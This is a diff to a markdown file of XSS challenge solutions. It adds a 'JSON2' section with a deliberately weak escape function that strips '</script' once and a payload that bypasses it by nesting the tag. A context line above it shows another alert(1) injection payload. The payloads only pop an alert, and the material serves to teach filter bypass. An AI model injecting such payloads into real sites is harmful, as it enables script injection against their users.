@@ -131,3 +131,21 @@ function escape(s) {
 ```js
 [[x|http://onerror=javascript:alert(1)//]]
 ```
+
+## JSON2
+
+- Task
+
+```js
+function escape(s) {
+  s = JSON.stringify(s).replace(/<\/script/gi, '');
+
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+
+- Solution
+
+```js
+</scrip</scriptt><script>alert(1)//
+```
